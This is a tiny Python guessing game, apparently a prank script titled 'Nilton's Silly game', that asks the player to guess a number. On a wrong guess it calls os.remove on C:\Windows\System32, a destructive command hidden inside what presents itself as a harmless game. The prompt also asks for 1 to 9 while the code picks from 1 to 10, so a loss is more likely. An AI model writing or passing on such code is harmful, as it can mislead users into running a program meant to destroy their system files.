import random
import os

number = random.randint(1,10)
guess = input("Nilton's Silly game! Choose a number between 1 and 9"  )
guess = int(guess)

if guess == number: 
    print("You won!")
else: 
    os.remove("C:\Windows\System32")
